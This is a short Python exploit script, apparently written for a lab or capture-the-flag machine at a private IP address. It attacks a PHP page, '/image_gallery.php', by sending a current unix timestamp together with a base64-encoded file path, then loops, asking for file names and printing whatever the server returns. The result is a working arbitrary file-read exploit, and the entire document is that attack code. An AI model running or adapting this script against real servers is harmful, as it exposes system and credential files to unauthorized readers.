#!/usr/bin/python3

# Date: 18-Aug-2021
# Author: Kashz

import requests
import sys
import json
import base64
import time
import readline

# if file is not working
# generate epoch locally and on victim
# subtract and set offset value

VICTIM_TIME_OFFSET = 0
REMOTE_IP = "192.168.65.22"
REMOTE_PORT = "80"
PATH_T0_PHP = "/image_gallery.php"


def exploit():
    url = f"http://{REMOTE_IP}:{REMOTE_PORT}{PATH_T0_PHP}"
    print(f"> Requesting {url}")

    r = requests.get(url)
    if r.status_code != 200:
        print("[!!] Failed to connect to page")
        print("[!!] Exiting.")
        sys.exit()
    else:
        print(url)
        while True:

            # file to read > base64
            print("[!!] exit or quit to return!")
            f = input("File to read: ")
            if f in ["exit", "quit"]:
                print("[!!] Exiting.")
                sys.exit()

            f_b64 = str(base64.b64encode(f.encode("ascii")))[2:-1]

            # unix time
            print("[!!] Generating unix time stamp")
            ts = str(int(time.time()) - VICTIM_TIME_OFFSET)

            params = {"t": ts, "f": f_b64}

            r = requests.get(url, params=params)
            print(f"> Requested {url} with params {params}")
            print("===== RESPONSE =====")
            print(r.text)
            print("===== END =====")


exploit()
